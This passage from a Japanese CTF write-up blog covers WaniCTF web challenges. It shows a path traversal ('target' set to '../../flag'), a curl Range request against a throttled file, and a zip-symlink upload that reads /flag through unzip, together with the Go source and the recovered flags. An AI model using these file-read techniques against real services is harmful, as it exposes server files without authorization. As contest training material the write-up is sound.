+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>Error</span>(),
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>			<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#a6e22e>result</span>,
+</span></span><span style=display:flex><span>		})
+</span></span><span style=display:flex><span>	})
+</span></span></code></pre></div><p>ここで<code>target</code>で指定されるパスが検証されないため、任意のパスを読み込むことができます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.go data-lang=:.go><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>ExtractContent</span>(<span style=color:#a6e22e>baseDir</span>, <span style=color:#a6e22e>extractTarget</span> <span style=color:#66d9ef>string</span>) (<span style=color:#66d9ef>string</span>, <span style=color:#66d9ef>error</span>) {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>raw</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>ReadFile</span>(<span style=color:#a6e22e>filepath</span>.<span style=color:#a6e22e>Join</span>(<span style=color:#a6e22e>baseDir</span>, <span style=color:#a6e22e>extractTarget</span>))
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#a6e22e>err</span>
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#f92672>...</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>flagはシステムの<code>/flag</code>に配置されています。</p><pre tabindex=0><code class=language-:Dockerfile data-lang=:Dockerfile>RUN echo &#34;FAKE{FAKE_FLAG}&#34; &gt; /flag
+
+RUN chmod 664 /flag
+</code></pre><p>適当なファイルを投げて、<code>target</code>を<code>../../flag</code>に変更することで、flagが得られます。</p><p><img src=/images/posts/35/extract_service1_flag.png alt=extract_service1_flag></p><pre tabindex=0><code>FLAG{ex7r4c7_1s_br0k3n_by_b4d_p4r4m3t3rs}
+</code></pre><h1 id=web-64bps>[web] 64bps</h1><blockquote><pre tabindex=0><code>dd if=/dev/random of=2gb.txt bs=1M count=2048
+cat flag.txt &gt;&gt; 2gb.txt
+rm flag.txt
+</code></pre><p>↓↓↓</p><p><a href=https://64bps-web.wanictf.org/2gb.txt>https://64bps-web.wanictf.org/2gb.txt</a></p></blockquote><p>配布される<code>Dockerfile</code>です。<code>2gb.txt</code>という2GBのファイルにflagを追記しています。</p><pre tabindex=0><code class=language-:.Dockerfile data-lang=:.Dockerfile>FROM nginx:1.23.3-alpine-slim
+
+COPY nginx.conf /etc/nginx/nginx.conf
+COPY flag.txt /usr/share/nginx/html/flag.txt
+
+RUN cd /usr/share/nginx/html &amp;&amp; \
+    dd if=/dev/random of=2gb.txt bs=1M count=2048 &amp;&amp; \
+    cat flag.txt &gt;&gt; 2gb.txt &amp;&amp; \
+    rm flag.txt
+</code></pre><p><code>nginx.conf</code>を見ると、帯域幅制限があって<code>2gb.txt</code>を全てダウンロードするのは難しそうです。</p><pre tabindex=0><code>user  nginx;
+worker_processes  auto;
+
+error_log  /var/log/nginx/error.log notice;
+pid        /var/run/nginx.pid;
+
+
+events {
+    worker_connections  1024;
+}
+
+
+http {
+    include       /etc/nginx/mime.types;
+    default_type  application/octet-stream;
+
+    keepalive_timeout  65;
+    gzip               off;
+    limit_rate         8; # 8 bytes/s = 64 bps
+
+    server {
+        listen       80;
+        listen  [::]:80;
+        server_name  localhost;
+
+        location / {
+            root   /usr/share/nginx/html;
+            index  index.html index.htm;
+        }
+    }
+}
+</code></pre><p>HTTPの<a href=https://triple-underscore.github.io/RFC7233-ja.html>Range Requests</a>を用いて<code>2gb.txt</code>のうちflagの部分だけをダウンロードします。</p><pre tabindex=0><code>$ curl -H &#34;Range: bytes=2147483648-21474836100&#34; https://64bps-web.wanictf.org/2gb.txt
+
+FLAG{m@ke_use_0f_r@n0e_reques7s_f0r_l@r9e_f1les}
+</code></pre><p>ちなみに、SECCON Beginners CTF 2022のgalleryもこの手法を使用する問題でした（<a href=https://melonattacker.github.io/posts/20/#web-gallery>参考</a>）。</p><pre tabindex=0><code>FLAG{m@ke_use_0f_r@n0e_reques7s_f0r_l@r9e_f1les}
+</code></pre><h1 id=web-extract-service-2>[web] Extract Service 2</h1><blockquote><p>Extract Service 1は脆弱性があったみたいなので修正しました！ 配布ファイルのsampleフォルダにお試し用のドキュメントファイルがあるのでぜひ使ってください。</p><p>サーバーの/flagファイルには秘密の情報が書いてあるけど大丈夫だよね&mldr;?</p><p>We have fixed Extract Service 1 as it had vulnerabilities! Please feel free to use the sample document file in the &ldquo;sample&rdquo; folder of the distribution file for trial purposes.</p><p>The secret information is written in the /flag file on the server, but it should be safe, right&mldr;?</p><p><a href=https://extract2-web.wanictf.org>https://extract2-web.wanictf.org</a></p></blockquote><p>Extract Service 1の続きです。<code>main.go</code>は以下です。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.go data-lang=:.go><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#a6e22e>main</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> (
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;net/http&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;os&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;os/exec&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;path/filepath&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;regexp&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;github.com/gin-gonic/gin&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;github.com/google/uuid&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;log&#34;</span>
+</span></span><span style=display:flex><span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>main</span>() {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>r</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>Default</span>()
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>LoadHTMLGlob</span>(<span style=color:#e6db74>&#34;templates/*&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>MaxMultipartMemory</span> = <span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>20</span> <span style=color:#75715e>// 1MiB, to prevent DoS
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>GET</span>(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>c</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>Context</span>) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>			<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>		})
+</span></span><span style=display:flex><span>	})
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>POST</span>(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>c</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>Context</span>) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>baseDir</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>filepath</span>.<span style=color:#a6e22e>Join</span>(<span style=color:#e6db74>&#34;/tmp&#34;</span>, <span style=color:#a6e22e>uuid</span>.<span style=color:#a6e22e>NewString</span>()) <span style=color:#75715e>// ex. /tmp/02050a65-8ae8-4b50-87ea-87b3483aab1e
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#a6e22e>zipPath</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>baseDir</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;.zip&#34;</span>                        <span style=color:#75715e>// ex. /tmp/02050a65-8ae8-4b50-87ea-87b3483aab1e.zip
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>file</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>FormFile</span>(<span style=color:#e6db74>&#34;file&#34;</span>)
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>Error</span>(),
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#75715e>// patched
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#a6e22e>extractTarget</span> <span style=color:#f92672>:=</span> <span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>targetParam</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>PostForm</span>(<span style=color:#e6db74>&#34;target&#34;</span>)
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>targetParam</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;&#34;</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : target is required&#34;</span>,
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>targetParam</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;docx&#34;</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>extractTarget</span> = <span style=color:#e6db74>&#34;word/document.xml&#34;</span>
+</span></span><span style=display:flex><span>		} <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>targetParam</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;xlsx&#34;</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>extractTarget</span> = <span style=color:#e6db74>&#34;xl/sharedStrings.xml&#34;</span>
+</span></span><span style=display:flex><span>		} <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>targetParam</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;pptx&#34;</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>extractTarget</span> = <span style=color:#e6db74>&#34;ppt/slides/slide1.xml&#34;</span>
+</span></span><span style=display:flex><span>		} <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : target is invalid&#34;</span>,
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>MkdirAll</span>(<span style=color:#a6e22e>baseDir</span>, <span style=color:#ae81ff>0777</span>); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>Error</span>(),
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>SaveUploadedFile</span>(<span style=color:#a6e22e>file</span>, <span style=color:#a6e22e>zipPath</span>); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Println</span>(<span style=color:#e6db74>&#34;SaveUploadedFile&#34;</span>, <span style=color:#a6e22e>err</span>)
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>Error</span>(),
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>ExtractFile</span>(<span style=color:#a6e22e>zipPath</span>, <span style=color:#a6e22e>baseDir</span>); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Println</span>(<span style=color:#e6db74>&#34;ExtractFile&#34;</span>, <span style=color:#a6e22e>err</span>)
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>Error</span>(),
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>result</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>ExtractContent</span>(<span style=color:#a6e22e>baseDir</span>, <span style=color:#a6e22e>extractTarget</span>)
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Println</span>(<span style=color:#e6db74>&#34;ExtractContent&#34;</span>, <span style=color:#a6e22e>err</span>)
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>Error</span>(),
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>			<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#a6e22e>result</span>,
+</span></span><span style=display:flex><span>		})
+</span></span><span style=display:flex><span>	})
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>Run</span>(<span style=color:#e6db74>&#34;:8080&#34;</span>); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>		panic(<span style=color:#a6e22e>err</span>)
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>ExtractFile</span>(<span style=color:#a6e22e>zipPath</span>, <span style=color:#a6e22e>baseDir</span> <span style=color:#66d9ef>string</span>) <span style=color:#66d9ef>error</span> {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>exec</span>.<span style=color:#a6e22e>Command</span>(<span style=color:#e6db74>&#34;unzip&#34;</span>, <span style=color:#a6e22e>zipPath</span>, <span style=color:#e6db74>&#34;-d&#34;</span>, <span style=color:#a6e22e>baseDir</span>).<span style=color:#a6e22e>Run</span>(); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>err</span>
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>nil</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>ExtractContent</span>(<span style=color:#a6e22e>baseDir</span>, <span style=color:#a6e22e>extractTarget</span> <span style=color:#66d9ef>string</span>) (<span style=color:#66d9ef>string</span>, <span style=color:#66d9ef>error</span>) {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>raw</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>ReadFile</span>(<span style=color:#a6e22e>filepath</span>.<span style=color:#a6e22e>Join</span>(<span style=color:#a6e22e>baseDir</span>, <span style=color:#a6e22e>extractTarget</span>))
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#a6e22e>err</span>
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>removeXmlTag</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>regexp</span>.<span style=color:#a6e22e>MustCompile</span>(<span style=color:#e6db74>&#34;&lt;.*?&gt;&#34;</span>)
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>resultXmlTagRemoved</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>removeXmlTag</span>.<span style=color:#a6e22e>ReplaceAllString</span>(string(<span style=color:#a6e22e>raw</span>), <span style=color:#e6db74>&#34;&#34;</span>)
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>removeNewLine</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>regexp</span>.<span style=color:#a6e22e>MustCompile</span>(<span style=color:#e6db74>`\r?\n`</span>)
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>resultNewLineRemoved</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>removeNewLine</span>.<span style=color:#a6e22e>ReplaceAllString</span>(<span style=color:#a6e22e>resultXmlTagRemoved</span>, <span style=color:#e6db74>&#34;&#34;</span>)
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>resultNewLineRemoved</span>, <span style=color:#66d9ef>nil</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>以下、Extract Service 1の<code>main.go</code>との差分です。<code>docx</code>の場合は<code>word/document.xml</code>、<code>xlsx</code>の場合は<code>xl/sharedStrings.xml</code>が<code>pptx</code>の場合は<code>ppt/slides/slide1.xml</code>が読み込まれます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.go data-lang=:.go><span style=display:flex><span><span style=color:#ae81ff>38</span>,<span style=color:#ae81ff>41</span><span style=color:#a6e22e>c38</span>,<span style=color:#ae81ff>39</span>
+</span></span><span style=display:flex><span>&lt; 		<span style=color:#75715e>// patched
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>&lt; 		<span style=color:#a6e22e>extractTarget</span> <span style=color:#f92672>:=</span> <span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>&lt; 		<span style=color:#a6e22e>targetParam</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>PostForm</span>(<span style=color:#e6db74>&#34;target&#34;</span>)
+</span></span><span style=display:flex><span>&lt; 		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>targetParam</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;&#34;</span> {
+</span></span><span style=display:flex><span><span style=color:#f92672>---</span>
+</span></span><span style=display:flex><span>&gt; 		<span style=color:#a6e22e>extractTarget</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>PostForm</span>(<span style=color:#e6db74>&#34;target&#34;</span>)
+</span></span><span style=display:flex><span>&gt; 		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>extractTarget</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;&#34;</span> {
+</span></span><span style=display:flex><span><span style=color:#ae81ff>47</span>,<span style=color:#ae81ff>58</span><span style=color:#a6e22e>d44</span>
+</span></span><span style=display:flex><span>&lt; 		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>targetParam</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;docx&#34;</span> {
+</span></span><span style=display:flex><span>&lt; 			<span style=color:#a6e22e>extractTarget</span> = <span style=color:#e6db74>&#34;word/document.xml&#34;</span>
+</span></span><span style=display:flex><span>&lt; 		} <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>targetParam</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;xlsx&#34;</span> {
+</span></span><span style=display:flex><span>&lt; 			<span style=color:#a6e22e>extractTarget</span> = <span style=color:#e6db74>&#34;xl/sharedStrings.xml&#34;</span>
+</span></span><span style=display:flex><span>&lt; 		} <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#a6e22e>targetParam</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;pptx&#34;</span> {
+</span></span><span style=display:flex><span>&lt; 			<span style=color:#a6e22e>extractTarget</span> = <span style=color:#e6db74>&#34;ppt/slides/slide1.xml&#34;</span>
+</span></span><span style=display:flex><span>&lt; 		} <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>&lt; 			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>&lt; 				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : target is invalid&#34;</span>,
+</span></span><span style=display:flex><span>&lt; 			})
+</span></span><span style=display:flex><span>&lt; 			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>&lt; 		}
+</span></span></code></pre></div><p>実際にdocxファイルなどをzipファイルとして展開してみるとわかりますが、<code>word/document.xml</code>にWord文書がXMLで定義されています（<a href=https://qiita.com/sky_y/items/2ab80adfb7a998e47239>参考</a>）。</p><p>この状況で<code>/flag</code>をどう読み込めば良いかどうかわからなかったので、適当に"docx upload unzip ctf"などで検索すると、作問者の方の過去の関連問題の<a href=https://hi120ki.github.io/blog/posts/20190814/>writeup</a>が出てきました。</p><p>シンボリックリンクで<code>/flag</code>を読み出す方針が良さそうです。zipファイルとして展開すると、<code>word/document.xml</code>が<code>/flag</code>へのシンボリックリンクになっている場合、<code>/flag</code>を読み込むことができます。</p><p>以下で、シンボリックリンクとzipファイルを作成します。</p><pre tabindex=0><code>$ mkdir word
+$ ln -s /flag ./word/document.xml
+$ zip -ry payload.zip word # -ryでシンボリックを維持してzip化
+</code></pre><p>作成したzipファイルをアップロードするとflagが得られました。</p><pre tabindex=0><code>FLAG{4x7ract_i3_br0k3n_by_3ymb01ic_1ink_fi1e}
+</code></pre><h1 id=web-screenshot>[web] screenshot</h1><blockquote><p>好きなウェブサイトのスクリーンショットを撮影してくれるアプリです。</p><p>An application that takes screenshots of your favorite websites.</p><p><a href=https://screenshot-web.wanictf.org>https://screenshot-web.wanictf.org</a></p></blockquote><p>URLを入力すると、そのwebサイトのスクリーンショットを撮影してくれるアプリケーションが提供されます。
